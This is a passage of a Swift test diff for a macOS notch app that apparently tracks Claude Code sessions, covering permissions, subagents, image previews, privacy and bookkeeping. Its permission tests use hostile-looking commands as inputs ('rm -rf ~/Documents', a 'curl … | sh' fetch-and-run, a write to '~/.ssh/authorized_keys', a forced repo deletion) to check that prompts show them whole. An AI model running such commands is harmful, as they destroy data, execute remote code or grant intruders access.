+        suite.expect(engine.permission(of: "s1")?.requestID == "r1" && engine.holds("r2", for: "s1"),
+                     "a newer request waits behind the one on screen instead of replacing it")
+        engine.resolvePermission(requestID: "r1")
+        suite.expect(engine.permission(of: "s1")?.requestID == "r2", "and shows once the first is answered")
+        suite.expect(!engine.holds("r1", for: "s1") && !engine.holds("r2", for: "other"), "answered or foreign requests are not held")
+        engine.ingest(hook: hook(.promptSubmitted, 22), now: at(22))
+        suite.expect(engine.permission(of: "s1") == nil, "a prompt typed after the requests means they were answered")
+        let third = ClaudePermission(requestID: "r3", tool: "Bash", summary: "ls", offersAlways: false, since: at(23))
+        engine.ingest(hook: hook(.permissionRequested(third), 23), now: at(23))
+        engine.ingest(hook: hook(.promptSubmitted, 22.5), now: at(24))
+        suite.expect(engine.permission(of: "s1") != nil, "a prompt from before the request does not settle it")
+        engine.resolvePermission(requestID: "r3")
+
+        engine.ingest(hook: hook(.permissionRequested(ask), 8), now: at(8))
+        engine.ingest(hook: hook(.stopped(lastText: nil), 9), now: at(9))
+        suite.expect(engine.permission(of: "s1") == nil, "a turn ending drops its request")
+
+        // A question Claude asks waits on an answer, not a permission.
+        let quiz = ClaudeSessionEngine()
+        quiz.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        _ = quiz.snapshot(now: at(1))
+        let question = ClaudePermission(requestID: "q1", tool: ClaudeQuestion.tool, summary: "Which color?", offersAlways: false,
+                                        since: at(2), questions: [ClaudeQuestion(question: "Which color?",
+                                                                                 options: [.init(label: "Red"), .init(label: "Blue")])])
+        quiz.ingest(hook: hook(.permissionRequested(question), 2), now: at(2))
+        let asked = quiz.snapshot(now: at(3))
+        suite.expect(asked.sessions.first?.phase == .waitingInput && asked.events == [.needsInput(id: "s1")]
+                     && asked.sessions.first?.permission?.asksQuestions == true,
+                     "a question waits for the person's answer and says so once")
+
+        // Two calls of one tool run side by side: the request belongs to the
+        // one whose input it carries, not the newest.
+        let twin = ClaudeSessionEngine()
+        twin.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        let keyA = ClaudeToolSummary.inputKey(name: "WebFetch", input: ["url": "https://a.example"])
+        let keyB = ClaudeToolSummary.inputKey(name: "WebFetch", input: ["url": "https://b.example"])
+        twin.ingest(hook: hook(.toolStarted(ClaudeToolUse(id: "w1", name: "WebFetch", started: at(1), inputKey: keyA)), 1), now: at(1))
+        twin.ingest(hook: hook(.toolStarted(ClaudeToolUse(id: "w2", name: "WebFetch", started: at(1), inputKey: keyB)), 1), now: at(1))
+        let fetch = ClaudePermission(requestID: "rw1", tool: "WebFetch", summary: "a.example", offersAlways: false,
+                                     since: at(2), inputKey: keyA)
+        twin.ingest(hook: hook(.permissionRequested(fetch), 2), now: at(2))
+        suite.expect(twin.permission(of: "s1")?.toolID == "w1", "a request is tied to the call with its input")
+        twin.ingest(hook: hook(.toolFinished(id: "w2", failed: false), 3), now: at(3))
+        suite.expect(twin.holds("rw1", for: "s1"), "the other call finishing leaves it waiting")
+        let unknown = ClaudePermission(requestID: "rw3", tool: "WebFetch", summary: nil, offersAlways: false, since: at(4))
+        twin.ingest(hook: hook(.permissionRequested(unknown), 4), now: at(4))
+        suite.expect(twin.permission(of: "s1")?.toolID == "w1" && twin.holds("rw3", for: "s1"),
+                     "a request that matches no single call is tied to none")
+
+        let sub = ClaudeSessionEngine()
+        sub.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        sub.ingest(hook: hook(.subagentStarted(id: "a1", type: "Explore"), 1), now: at(1))
+        sub.ingest(hook: hook(.toolStarted(tool("t2", 2, "Grep")), 2, agent: "a1"), now: at(2))
+        sub.ingest(hook: hook(.permissionRequested(ask), 3, agent: "a1"), now: at(3))
+        let state = only(sub, 4)
+        suite.expect(state?.timeline.isEmpty == true, "a subagent's tools stay out of the session's timeline")
+        suite.expect(state?.phase == .waitingPermission, "a subagent's permission still waits on the person")
+        suite.expect(state?.subagents.map(\.type) == ["Explore"] && state?.subagents.first?.isRunning == true,
+                     "the subagent is listed as running")
+        sub.ingest(hook: hook(.subagentStopped(id: "a1"), 5, agent: "a1"), now: at(5))
+        suite.expect(only(sub, 6)?.subagents.first?.isRunning == false, "and as done once it stops")
+        // Claude Code's own forks, like the one that saves memories, run
+        // tools under an agent id of their own, but never start or stop as
+        // subagents and keep no transcript.
+        let fork = ClaudeSessionEngine()
+        fork.ingest(records: [record(status: .idle, changed: 0)], now: at(0))
+        fork.ingest(hook: hook(.toolStarted(tool("f1", 2, "Read")), 2, agent: "a9"), now: at(2))
+        fork.ingest(hook: hook(.toolFinished(id: "f1", failed: false), 3, agent: "a9"), now: at(3))
+        suite.expect(only(fork, 4)?.subagents.isEmpty == true, "a fork's tools list no subagent")
+        fork.ingest(sessionID: "s1", facts: [.subagentActivity(id: "a9", at: at(5))], now: at(5))
+        suite.expect(only(fork, 6)?.subagents.map(\.id) == ["a9"], "one whose transcript turns up is listed")
+        // A hook is dated when it arrived, so a late one does not keep a
+        // subagent working past the registry's rest; its transcript does.
+        let settled = ClaudeSessionEngine()
+        settled.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        settled.ingest(hook: hook(.subagentStarted(id: "a1", type: "Explore"), 1), now: at(1))
+        settled.ingest(hook: hook(.toolStarted(tool("g1", 7, "Grep")), 7, agent: "a1"), now: at(7))
+        settled.ingest(records: [record(status: .idle, changed: 5)], now: at(8))
+        suite.expect(only(settled, 9)?.subagents.first?.finished == at(5), "a hook that arrived late does not hold it")
+        settled.ingest(sessionID: "s1", facts: [.subagentActivity(id: "a1", at: at(10))], now: at(10))
+        suite.expect(only(settled, 11)?.subagents.first?.isRunning == true, "its transcript working later does")
+    }
+
+    // MARK: Images
+
+    static func images(_ suite: TestSuite) {
+        func image(_ name: String) -> ClaudeChatImage {
+            ClaudeChatImage(key: name.hashValue, source: .preview(Data(name.utf8)))
+        }
+        let shot = image("shot")
+        let engine = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        engine.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        engine.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)), .prompt("", at: at(1), images: [shot]), .prompt("", at: at(1), images: [shot]),
+            .text("A red build.", at: at(2)),
+            .prompt("", at: at(3), images: [shot]), .prompt("[Image #1] and now?", at: at(4), images: [image("next")]),
+        ], now: at(4))
+        let chat = only(engine, 5)?.chat ?? []
+        suite.expect(chat.map(\.text) == ["", "A red build.", "", "[Image #1] and now?"]
+                     && chat.map(\.images.count) == [1, 0, 1, 1] && chat.first?.role == .user,
+                     "an image prompt joins the conversation once per reading, again when sent again: \(chat.map(\.text))")
+        engine.policy = ClaudeContentPolicy(previews: false)
+        suite.expect(only(engine, 6)?.chat.isEmpty == true, "turning previews off lets the images go with the words")
+
+        let hidden = ClaudeSessionEngine()
+        hidden.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        hidden.ingest(sessionID: "s1", facts: [.prompt("", at: at(1), images: [shot])], now: at(1))
+        suite.expect(only(hidden, 2)?.chat.isEmpty == true, "with previews off no image is kept")
+
+        let long = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        long.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        long.ingest(sessionID: "s1", facts: (0..<30).map { .prompt("Look \($0)", at: at(Double($0)), images: [image("i\($0)")]) },
+                    now: at(30))
+        let kept = only(long, 31)?.chat ?? []
+        suite.expect(kept.count == 30 && kept.reduce(0) { $0 + $1.images.count } == ClaudeChatImage.kept
+                     && kept.last?.images == [image("i29")] && kept.first?.images.isEmpty == true
+                     && kept.first?.text == "Look 0",
+                     "a long conversation keeps the previews of its latest prompts only, and every prompt's words")
+        var files = [ClaudeChatMessage(id: 1, role: .user, text: "", at: at(0),
+                                       images: [ClaudeChatImage.file("/tmp/a.png")!, image("x")]),
+                     ClaudeChatMessage(id: 2, role: .user, text: "", at: at(1), images: [image("y")])]
+        ClaudeChatImage.trim(&files, images: \.images, kept: 1)
+        suite.expect(files[0].images == [ClaudeChatImage.file("/tmp/a.png")!] && files[1].images.count == 1,
+                     "an image in a file costs nothing until shown, so it always stays")
+        suite.expect(ClaudeChatImage.file("relative/a.png") == nil, "only an absolute path names a file")
+
+        let label = NotchClaudeSessionsSupport.withoutImageLabels
+        suite.expect(label("[Image #1] what broke?", 1) == "what broke?" && label("[image #2]", 1) == "",
+                     "the labels of images shown beside the words go")
+        suite.expect(label("[Image #1] and [Image #2]", 1) == "[Image #1] and [Image #2]",
+                     "while an image is missing every label stays")
+        suite.expect(label("[Image #1] what broke?", 0) == "[Image #1] what broke?", "and with none shown")
+    }
+
+    // MARK: Content
+
+    static func content(_ suite: TestSuite) {
+        let secret = "SENTINEL-7f3a"
+        let closed = ClaudeSessionEngine()
+        closed.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        closed.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)), .title(secret), .text(secret, at: at(2)),
+            .toolStarted(tool("t1", 3, summary: secret)),
+            .subagentInfo(id: "a1", type: "Plan", description: secret),
+            .tasks(ClaudeTaskProgress(done: 1, total: 3, current: secret)),
+            .prompt(secret, at: at(2)), .text(secret, at: at(2)),
+        ], now: at(3))
+        let quiet = ClaudeSessionEngine()
+        quiet.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        quiet.ingest(hook: hook(.toolStarted(tool("t1", 1, summary: secret)), 1), now: at(1))
+        quiet.ingest(hook: hook(.stopped(lastText: secret), 2), now: at(2))
+        for (engine, label) in [(closed, "transcript"), (quiet, "hooks")] {
+            let state = only(engine, 4)
+            suite.expect(state != nil && !String(describing: state!).contains(secret),
+                         "with previews off nothing a session wrote reaches the island (\(label))")
+        }
+        suite.expect(only(closed, 4)?.tasks?.done == 1 && only(closed, 4)?.tasks?.total == 3,
+                     "task progress counts are kept without their names")
+        suite.expect(only(closed, 4)?.subagents.first?.type == "Plan", "a subagent's type is kept without its task")
+
+        let ask = ClaudePermission(requestID: "r1", tool: "Bash", summary: secret, offersAlways: false, since: at(5))
+        quiet.ingest(hook: hook(.permissionRequested(ask), 5), now: at(5))
+        suite.expect(only(quiet, 6)?.permission?.summary == secret,
+                     "a pending permission always shows what it would run")
+
+        let open = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        open.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        open.ingest(sessionID: "s1", facts: [
+            .turnBegan(at(1)), .title("Fix the build"), .text("Done, tests pass.", at: at(2)),
+            .toolStarted(tool("t1", 3, summary: "npm test")),
+        ], now: at(3))
+        let shown = only(open, 4)
+        suite.expect(shown?.title == "Fix the build" && shown?.lastText == "Done, tests pass."
+                     && shown?.timeline.first?.summary == "npm test", "with previews on titles, replies and commands show")
+        open.policy = ClaudeContentPolicy(previews: false)
+        let purged = only(open, 5)
+        suite.expect(purged?.title == nil && purged?.lastText == nil && purged?.timeline.first?.summary == nil,
+                     "turning previews off clears what was read")
+        open.policy = ClaudeContentPolicy(previews: true)
+        suite.expect(only(open, 6)?.title == nil, "and turning them back on does not bring it back by itself")
+
+        let talk = ClaudeSessionEngine(policy: ClaudeContentPolicy(previews: true))
+        talk.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        talk.ingest(sessionID: "s1", facts: [
+            .prompt("Fix the build", at: at(1)), .text("Looking.", at: at(2)), .text("Looking.", at: at(2)),
+            .prompt("Also run lint", at: at(3)), .text("Both pass.", at: at(4)),
+        ], now: at(4))
+        let chat = only(talk, 5)?.chat ?? []
+        suite.expect(chat.map(\.text) == ["Fix the build", "Looking.", "Also run lint", "Both pass."]
+                     && chat.map(\.role) == [.user, .assistant, .user, .assistant],
+                     "the conversation keeps prompts and replies in order, once each: \(chat.map(\.text))")
+        suite.expect(Set(chat.map(\.id)).count == chat.count, "each message has its own id")
+        suite.expect(chat.allSatisfy { !$0.endsTurn }, "a reply ends no turn unless the transcript says so")
+        talk.ingest(sessionID: "s1", facts: [.text("Both pass.", at: at(4), endsTurn: true)], now: at(4))
+        let ended = only(talk, 5)?.chat ?? []
+        suite.expect(ended.count == 4 && ended.last?.endsTurn == true,
+                     "a reply read again as the one its turn ended on is marked, not repeated")
+        talk.ingest(sessionID: "s1", facts: [.text("Both pass.", at: at(4))], now: at(4))
+        suite.expect(only(talk, 5)?.chat.last?.endsTurn == true, "and reading it again plainly keeps the mark")
+        talk.ingest(sessionID: "s1", facts: [
+            .prompt("Ship it", at: at(5)), .text("Shipping.", at: at(6)), .text("Shipped.", at: at(7), endsTurn: true),
+        ], now: at(7))
+        let shipped = only(talk, 8)?.chat ?? []
+        suite.expect(shipped.map(\.text).suffix(3) == ["Ship it", "Shipping.", "Shipped."]
+                     && shipped.suffix(3).map(\.endsTurn) == [false, false, true],
+                     "a new reply its turn ended on joins the conversation marked: \(shipped.map(\.text))")
+        let answers = NotchClaudeSessionsSupport.answers(in: [
+            ClaudeChatMessage(id: 1, role: .user, text: "Ship it", at: at(1)),
+            ClaudeChatMessage(id: 2, role: .assistant, text: "Building.", at: at(2)),
+            ClaudeChatMessage(id: 3, role: .assistant, text: "Back in 10 minutes.", at: at(3), endsTurn: true),
+            ClaudeChatMessage(id: 4, role: .assistant, text: "Uploading.", at: at(4)),
+            ClaudeChatMessage(id: 5, role: .assistant, text: "Sent for review.", at: at(5), endsTurn: true),
+            ClaudeChatMessage(id: 6, role: .user, text: "And the poster?", at: at(6)),
+            ClaudeChatMessage(id: 7, role: .assistant, text: "Looking.", at: at(7)),
+            ClaudeChatMessage(id: 8, role: .user, text: "Thanks", at: at(8)),
+        ])
+        suite.expect(answers.answers == [3, 5] && answers.onTheWay == [2, 4],
+                     "each turn's last reply sums it up, a timer's turn too, and what came before it was on the way")
+        let command = NotchClaudeSessionsSupport.answers(in: [
+            ClaudeChatMessage(id: 1, role: .user, text: "Fix the build", at: at(1)),
+            ClaudeChatMessage(id: 2, role: .assistant, text: "Fixed; tests pass.", at: at(2), endsTurn: true),
+            ClaudeChatMessage(id: 3, role: .assistant, text: "Reviewing the diff.", at: at(3)),
+            ClaudeChatMessage(id: 4, role: .assistant, text: "No issues found.", at: at(4), endsTurn: true),
+        ])
+        suite.expect(command.answers == [2, 4] && command.onTheWay == [3],
+                     "a turn begun with no prompt shown, as by /review, keeps the answer before it as it was")
+        let running = NotchClaudeSessionsSupport.answers(in: [
+            ClaudeChatMessage(id: 1, role: .user, text: "Ship it", at: at(1)),
+            ClaudeChatMessage(id: 2, role: .assistant, text: "Done.", at: at(2), endsTurn: true),
+            ClaudeChatMessage(id: 3, role: .assistant, text: "Checking again.", at: at(3)),
+        ])
+        suite.expect(running.answers == [2] && running.onTheWay.isEmpty,
+                     "a reply after the answer, from a turn still running, stays as it is")
+        suite.expect(NotchClaudeSessionsSupport.answers(in: []).answers.isEmpty, "an empty conversation has no answer")
+        talk.ingest(sessionID: "s1", facts: (0..<(ClaudeSessionEngine.chatLength + 10)).map { .text("m\($0)", at: at(10)) },
+                    now: at(10))
+        let long = only(talk, 11)?.chat ?? []
+        suite.expect(long.count == ClaudeSessionEngine.chatLength && long.last?.text == "m\(ClaudeSessionEngine.chatLength + 9)",
+                     "a long conversation keeps its latest messages")
+        talk.policy = ClaudeContentPolicy(previews: false)
+        suite.expect(only(talk, 12)?.chat.isEmpty == true, "turning previews off clears the conversation")
+    }
+
+    // MARK: Bookkeeping
+
+    static func bookkeeping(_ suite: TestSuite) {
+        let engine = ClaudeSessionEngine()
+        engine.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        let first = AgentTokens(input: 10, cacheWrite: 0, cacheRead: 100, output: 5)
+        let streamed = AgentTokens(input: 10, cacheWrite: 0, cacheRead: 100, output: 40)
+        engine.ingest(sessionID: "s1", facts: [
+            .usage(key: "m1", tokens: first, cost: 0.01), .usage(key: "m1", tokens: streamed, cost: 0.02),
+            .usage(key: "m2", tokens: first, cost: 0.01), .branch("feat/x"), .model("claude-opus-5-5"),
+        ], now: at(1))
+        let state = only(engine, 2)
+        suite.expect(state?.tokens.output == 45, "streamed blocks of one reply count once at their largest")
+        suite.expectClose(state?.cost ?? 0, 0.03, "cost adds up across replies")
+        suite.expect(state?.branch == "feat/x" && state?.model == "claude-opus-5-5", "branch and model are kept")
+        suite.expect(state?.project == "app", "the project is the folder's name")
+
+        var tools: [ClaudeTranscriptFact] = [.turnBegan(at(1))]
+        for index in 0..<40 {
+            tools.append(.toolStarted(tool("t\(index)", Double(index) + 2)))
+            tools.append(.toolFinished(id: "t\(index)", at: at(Double(index) + 2.5), failed: index == 39))
+        }
+        engine.ingest(sessionID: "s1", facts: tools, now: at(50))
+        let timeline = only(engine, 51)?.timeline ?? []
+        suite.expect(timeline.count == ClaudeSessionEngine.timelineLength && timeline.last?.id == "t39"
+                     && timeline.last?.failed == true, "the timeline keeps the latest tools in order")
+
+        // Subagents: the transcript's start and type stay; a hook adds to them.
+        let team = ClaudeSessionEngine()
+        team.ingest(records: [record(status: .busy, changed: 0)], now: at(0))
+        team.ingest(sessionID: "s1", facts: [.subagentActivity(id: "a1", at: at(10)),
+                                             .subagentInfo(id: "a1", type: "general-purpose", description: nil)], now: at(10))
+        team.ingest(hook: hook(.subagentStarted(id: "a1", type: ""), 40), now: at(40))
+        suite.expect(only(team, 41)?.subagents.first.map { $0.type == "general-purpose" && $0.started == at(10) } == true,
+                     "a late start hook keeps the subagent's real start and type")
+        team.ingest(hook: hook(.subagentStopped(id: "ghost"), 42), now: at(42))
+        suite.expect(only(team, 43)?.subagents.count == 1, "a stop for a subagent not seen adds no blank row")
+        team.ingest(sessionID: "s1", facts: [.subagentActivity(id: "ghost", at: at(30))], now: at(44))
+        suite.expect(only(team, 45)?.subagents.first { $0.id == "ghost" }?.finished == at(42),
+                     "and ends it once its transcript is read")
+        team.ingest(sessionID: "s1", facts: [.subagentActivity(id: "a2", at: at(20)), .subagentEnded(id: "a1", at: at(50))], now: at(50))
+        let order = only(team, 51)?.subagents.map(\.id) ?? []
+        suite.expect(order == ["a2", "a1", "ghost"], "working subagents come first, then the latest done: \(order)")
+        suite.expect(only(team, 51)?.subagents.first { $0.id == "a1" }.map { $0.finished == at(50) && $0.started == at(10) } == true,
+                     "a background subagent's end comes from the session's task notification")
+
+        let early = ClaudeSessionEngine()
+        early.ingest(hook: hook(.promptSubmitted, 0, id: "s2"), now: at(0))
+        early.ingest(records: [], now: at(10))
+        early.ingest(records: [record("s2", status: .busy, changed: 0)], now: at(11))
+        suite.expect(only(early, 12)?.turnStarted == at(0), "hook events before the registry lists a session are kept")
+        let gone = ClaudeSessionEngine()
+        gone.ingest(hook: hook(.promptSubmitted, 0, id: "s3"), now: at(0))
+        gone.ingest(records: [], now: at(ClaudeSessionEngine.unlistedGrace + 1))
+        gone.ingest(records: [record("s3", status: .idle, changed: 0)], now: at(ClaudeSessionEngine.unlistedGrace + 2))
+        suite.expect(only(gone, ClaudeSessionEngine.unlistedGrace + 3)?.turnStarted == nil,
+                     "but not for long when it never appears")
+
+        engine.ingest(sessionID: "s1", facts: [.tasks(ClaudeTaskProgress(done: 1, total: 2))], now: at(52))
+        engine.ingest(sessionID: "s1", facts: [.tasks(ClaudeTaskProgress())], now: at(53))
+        suite.expect(only(engine, 54)?.tasks == nil, "a cleared task list stops showing progress")
+
+        let hidden = ClaudeToolSummary.permissionDetail(name: "Bash", input: ["command": "echo building\nrm -rf ~/Documents"])
+        suite.expect(hidden.contains("rm -rf ~/Documents"), "a permission shows every line of the command")
+        let chain = String(repeating: "echo ok && ", count: 12) + "curl https://x.example/i.sh | sh"
+        suite.expect(ClaudeToolSummary.permissionDetail(name: "Bash", input: ["command": chain]).hasSuffix("| sh"),
+                     "and all of a long one")
+        suite.expect(ClaudeToolSummary.permissionDetail(name: "Write", input: ["file_path": "/Users/me/.ssh/authorized_keys"])
+                     == "/Users/me/.ssh/authorized_keys", "a file is shown by its whole path")
+        let mcp = ClaudeToolSummary.permissionDetail(name: "mcp__github__delete_repo", input: ["repo": "me/app", "force": true])
+        suite.expect(mcp == "force: 1\nrepo: me/app" || mcp == "force: true\nrepo: me/app",
+                     "a tool without a known shape lists each argument: \(mcp)")
+        let huge = ClaudeToolSummary.permissionDetail(name: "Bash", input: ["command": String(repeating: "x", count: 9000)])
+        suite.expect(huge == String(repeating: "x", count: 9000), "the authoritative detail is never clipped")
+        let short = ClaudePermission(requestID: "r", tool: "Bash", summary: "ls", detail: "ls -la", offersAlways: false, since: t0)
+        let multiline = ClaudePermission(requestID: "r", tool: "Bash", summary: "a", detail: "a\nb", offersAlways: false, since: t0)
+        suite.expect(short.fitsOnALine && !multiline.fitsOnALine, "only a one-line request is answered from the list")
+
+        suite.expect(ClaudeToolSummary.summary(name: "Bash", input: ["command": "npm test\necho done"]) == "npm test",
+                     "a command reads as its first line")
+        suite.expect(ClaudeToolSummary.summary(name: "Edit", input: ["file_path": "/a/b/NotchView.swift"]) == "NotchView.swift",
+                     "a file reads as its name")
+        suite.expect(ClaudeToolSummary.summary(name: "WebFetch", input: ["url": "https://docs.example.com/x"]) == "docs.example.com",
+                     "a fetch reads as its host")
+        suite.expect(ClaudeToolSummary.summary(name: "Bash", input: ["command": "   "]) == nil, "blank input reads as nothing")
+        let long = ClaudeToolSummary.summary(name: "Bash", input: ["command": String(repeating: "x", count: 200)]) ?? ""
+        suite.expect(long.count == ClaudeToolSummary.limit && long.hasSuffix("…"), "long input is clipped")
+    }
+
+    // MARK: Support
+
+    static func support(_ suite: TestSuite) {
+        func session(_ id: String, _ phase: ClaudeSessionPhase, since: TimeInterval, project: String,
+                     host: ClaudeSessionHost = .terminal(tty: "/dev/ttys001")) -> ClaudeSession {
+            ClaudeSession(id: id, pid: Int32(id.count), cwd: "/x/" + project, project: project, name: project,
+                          host: host, phase: phase, phaseSince: at(since), turnStarted: at(since), timeline: [],
+                          subagents: [], tokens: AgentTokens(), cost: 0, hooked: false)
+        }
+        var named = session("a", .idle, since: 0, project: "meettime")
+        named.name = "meettime-86"
+        suite.expect(NotchClaudeSessionsSupport.name(named, custom: nil) == "meettime-86",
+                     "a session with nothing else is called by Claude Code's name")
+        named.title = "Bombs in the tutorial"
+        suite.expect(NotchClaudeSessionsSupport.name(named, custom: nil) == "Bombs in the tutorial",
+                     "its conversation's title reads better than a name made from the folder")
+        named.nameSource = "auto"
+        suite.expect(NotchClaudeSessionsSupport.name(named, custom: "  ") == "Bombs in the tutorial",
+                     "and better than one Claude Code made up; a blank name of the person's own counts for nothing")
+        named.nameSource = "user"
+        suite.expect(NotchClaudeSessionsSupport.name(named, custom: nil) == "meettime-86", "a name given with /rename wins")
+        suite.expect(NotchClaudeSessionsSupport.name(named, custom: " Android bubbles ") == "Android bubbles",
+                     "and the person's own name in the island wins over all")
+        let colors = ["meettime", "vorsaint plugin", "dawidbuszta", "Nexus-Code"].map(NotchClaudeSessionsSupport.projectColor)
+        suite.expect(colors.allSatisfy { (0..<NotchClaudeSessionsSupport.projectColors).contains($0) }
+                     && NotchClaudeSessionsSupport.projectColor("meettime") == colors[0]
+                     && NotchClaudeSessionsSupport.projectColor("MeetTime") == colors[0] && Set(colors).count > 1,
+                     "a project keeps one color, whatever the case of its name: \(colors)")
+        let long = String(repeating: "x", count: 90)
+        var kept = NotchClaudeSessionsSupport.renamed([:], id: "a", to: long, live: ["a"])
+        suite.expect(kept["a"]?.count == NotchClaudeSessionsSupport.nameLimit, "a name is kept to its limit")
+        kept = NotchClaudeSessionsSupport.renamed(kept, id: "a", to: " ", live: ["a"])
+        suite.expect(kept["a"] == nil, "an empty name gives the session its own back")
+        let many = Dictionary(uniqueKeysWithValues: (0..<NotchClaudeSessionsSupport.namesKept).map { ("old\($0)", "n") })
+        kept = NotchClaudeSessionsSupport.renamed(many.merging(["live": "keep"]) { a, _ in a }, id: "new", to: "fresh",
+                                                  live: ["live", "new"])
+        suite.expect(kept.count == NotchClaudeSessionsSupport.namesKept && kept["live"] == "keep" && kept["new"] == "fresh",
+                     "past the limit, names of sessions no longer running go first")
+
+        let order = NotchClaudeSessionsSupport.sorted([
+            session("a", .idle, since: 0, project: "zeta"), session("b", .finished, since: 5, project: "b"),
+            session("c", .generating, since: 9, project: "c"), session("d", .waitingPermission, since: 7, project: "d"),
+            session("e", .finished, since: 8, project: "e"), session("f", .runningTool, since: 3, project: "f"),
+            session("g", .idle, since: 0, project: "alpha"), session("h", .waitingInput, since: 1, project: "h"),
+        ]).map(\.id)
+        suite.expect(order == ["d", "h", "f", "c", "e", "b", "g", "a"],
+                     "waiting sessions lead, then work by start, unread results newest first, idle by name: \(order)")
+        var old = session("old", .idle, since: 0, project: "alpha"), fresh = session("fresh", .idle, since: 0, project: "zeta")
+        old.lastActive = at(10)
+        fresh.lastActive = at(500)
+        let rendering = session("bg", .background, since: 2, project: "m")
+        let quiet = NotchClaudeSessionsSupport.sorted([old, fresh, rendering]).map(\.id)
+        suite.expect(quiet == ["bg", "fresh", "old"],
+                     "a session that just went quiet stays above long quiet ones, under work in the background: \(quiet)")
+
+        let expand = NotchClaudeSessionsSupport.shouldAutoExpand
+        let ask = ClaudeSessionEvent.needsPermission(id: "a", tool: "Bash")
+        suite.expect(expand(ask, true, false, false), "a permission opens a closed island")
+        suite.expect(expand(.needsInput(id: "a"), true, false, false), "and so does a question")
+        suite.expect(!expand(ask, true, true, false), "an open island, list or page, never changes under the pointer")
+        suite.expect(!expand(ask, false, false, false), "nor when the setting is off")
+        suite.expect(!expand(ask, true, false, true), "nor while the island is held back")
+        suite.expect(!expand(.finished(id: "a", duration: 3), true, false, false), "a result only shows a notice")
+
+        suite.expect(NotchClaudeSessionsSupport.canReply(session("a", .finished, since: 0, project: "a")),
+                     "a reply goes to a session in Terminal")
+        suite.expect(!NotchClaudeSessionsSupport.canReply(session("a", .waitingPermission, since: 0, project: "a")),
+                     "never while it waits on a dialog")
+        suite.expect(!NotchClaudeSessionsSupport.canReply(session("a", .idle, since: 0, project: "a", host: .app("com.x"))),
+                     "nor to a terminal the island cannot type into")
+        suite.expect(NotchClaudeSessionsSupport.reply("  hi\n") == "hi" && NotchClaudeSessionsSupport.reply(" \n ") == nil,
+                     "replies are trimmed and blank ones are not sent")
+        suite.expect(NotchClaudeSessionsSupport.reply(String(repeating: "a", count: 9000))?.count
+                     == NotchClaudeSessionsSupport.replyLimit, "long replies are capped")
+
+        let reading = NotchClaudeSessionsSupport.stripReading(ClaudeSessionCounts(working: 2, waiting: 0, finished: 1))
+        suite.expect(reading.map(\.count) == [2, 1], "the strip leaves out empty counts")
+        let counts = ClaudeSessionCounts([session("a", .waitingInput, since: 0, project: "a"),
+                                          session("b", .runningTool, since: 0, project: "b"),
+                                          session("c", .finished, since: 0, project: "c")])
+        suite.expect(counts == ClaudeSessionCounts(working: 1, waiting: 1, finished: 1), "sessions are counted by phase")
+
+        let activities = NotchSupport.compactActivities(timer: false, watch: true, sessions: true, downloads: true, agents: true,
+                                                        calendar: false, music: true)
+        suite.expect(activities == [.watch, .sessions, .downloads, .agents, .music],
+                     "sessions come before downloads and the AI reading beside the camera: \(activities)")
+        suite.expect(NotchSupport.compactActivities(timer: false, downloads: false, agents: true, calendar: false, music: false)
+                     == [.agents], "and are left out unless they show")
+        suite.expect(NotchCompactActivity.sessions.module == .sessions && NotchModule.sessions.shortcutKey == "l",
+                     "the strip opens the Sessions page, which has its own key")
+        suite.expect(NotchEvent.sessions.preferenceKey == DefaultsKey.notchSessionsEnabled
+                     && NotchEvent.sessions.priority >= NotchEvent.agents.priority,
+                     "a session waiting on the person outranks the AI section's notices")
+        let narrow = NotchClaudeSessionsSupport.stripReadingWidth(ClaudeSessionCounts(working: 1), textSize: 13)
+        let wide = NotchClaudeSessionsSupport.stripReadingWidth(ClaudeSessionCounts(working: 12, waiting: 1, finished: 3), textSize: 13)
+        suite.expect(narrow > 0 && wide > narrow && NotchClaudeSessionsSupport.stripReadingWidth(ClaudeSessionCounts(), textSize: 13) == 0,
+                     "the strip grows with what it counts")
+
+        let turn = at(40)
+        suite.expect(NotchClaudeSessionsSupport.thinkingWord(turn: turn) == NotchClaudeSessionsSupport.thinkingWord(turn: turn)
+                     && NotchClaudeSessionsSupport.thinkingWords.contains(NotchClaudeSessionsSupport.thinkingWord(turn: nil))
+                     && NotchClaudeSessionsSupport.thinkingWords.contains(NotchClaudeSessionsSupport.thinkingWord(turn: Date(timeIntervalSinceReferenceDate: -7))),
+                     "a turn keeps one word while it runs, before the reference date too")
+        let glyphs = (0..<12).map(NotchClaudeSessionsSupport.thinkingGlyph(step:))
+        suite.expect(glyphs == ["·", "✢", "✳", "✶", "✻", "✽", "✻", "✶", "✳", "✢", "·", "✢"]
+                     && NotchClaudeSessionsSupport.thinkingGlyph(step: -3) != "",
+                     "the star turns forward, then back: \(glyphs.joined())")
+        let fenced = NotchClaudeSessionsSupport.markdown("Here:\n```swift\nlet x = 1\nlet y = 2\n```\nDone **now**")
+        suite.expect(String(fenced.characters) == "Here:\nlet x = 1\nlet y = 2\nDone now",
+                     "a fenced block keeps its lines and drops its fence: \(String(fenced.characters).debugDescription)")
+        suite.expect(fenced.runs.contains { run in
+            run.inlinePresentationIntent?.contains(.code) == true && String(fenced[run.range].characters) == "let x = 1\nlet y = 2"
+        }, "and reads as code")
+        let linkedReply = NotchClaudeSessionsSupport.markdown("PR: https://github.com/MF-DEEV/x/pull/1, see [docs](https://a.dev) or `https://code.example`")
+        let links = linkedReply.runs.compactMap(\.link).map(\.absoluteString)
+        suite.expect(links == ["https://github.com/MF-DEEV/x/pull/1", "https://a.dev"],
+                     "addresses written out become links beside Markdown ones, but not in code: \(links)")
+        let rendered = NotchClaudeSessionsSupport.markdown("Fixed **two bugs** in `NotchView`\n- *one* line")
